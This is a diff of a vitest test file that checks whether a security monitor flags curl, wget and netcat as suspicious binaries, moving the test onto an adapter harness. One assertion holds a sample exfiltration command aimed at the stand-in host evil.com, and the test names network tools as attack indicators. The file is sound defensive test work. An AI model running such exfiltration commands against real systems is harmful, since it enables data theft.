@@ -5,15 +5,17 @@
 // Verifies that ARP flags events for suspicious binaries commonly used
 // for exfiltration, lateral movement, or exploitation (curl, wget, nc).
 
-import { describe, it, expect, beforeEach, afterEach } from 'vitest';
-import { ArpWrapper } from '../../harness/arp-wrapper';
+import { it, expect, beforeEach, afterEach } from 'vitest';
+import { describeWithCapability } from '../../harness/capabilities';
+import { createAdapter } from '../../harness/create-adapter';
+import type { SecurityProductAdapter } from '../../harness/adapter';
 
-describe('AT-PROC-002: Suspicious Binary Detection', () => {
-  let arp: ArpWrapper;
+describeWithCapability('process-monitoring', 'AT-PROC-002: Suspicious Binary Detection', () => {
+  let arp: SecurityProductAdapter;
 
   beforeEach(async () => {
     // Monitors disabled: we inject synthetic events directly
-    arp = new ArpWrapper({
+    arp = createAdapter({
       monitors: { process: false },
     });
     await arp.start();
@@ -37,7 +39,7 @@ describe('AT-PROC-002: Suspicious Binary Detection', () => {
       },
     });
 
-    const events = arp.collector.eventsByCategory('violation');
+    const events = arp.getEventsByCategory('violation');
     expect(events.length).toBe(1);
     expect(events[0].data.binary).toBe('curl');
     expect(events[0].data.command).toBe('curl http://evil.com/exfil');
@@ -58,7 +60,7 @@ describe('AT-PROC-002: Suspicious Binary Detection', () => {
       },
     });
 
-    const events = arp.collector.eventsByCategory('violation');
+    const events = arp.getEventsByCategory('violation');
     expect(events.length).toBe(1);
     expect(events[0].data.binary).toBe('wget');
     expect(events[0].severity).toBe('high');
@@ -78,7 +80,7 @@ describe('AT-PROC-002: Suspicious Binary Detection', () => {
       },
     });
 
-    const events = arp.collector.eventsByCategory('violation');
+    const events = arp.getEventsByCategory('violation');
     expect(events.length).toBe(1);
     expect(events[0].data.binary).toBe('nc');
     expect(events[0].severity).toBe('high');
@@ -106,7 +108,7 @@ describe('AT-PROC-002: Suspicious Binary Detection', () => {
       });
     }
 
-    const violations = arp.collector.eventsByCategory('violation');
+    const violations = arp.getEventsByCategory('violation');
     expect(violations.length).toBe(3);
 
     const detectedBinaries = violations.map((e) => e.data.binary);
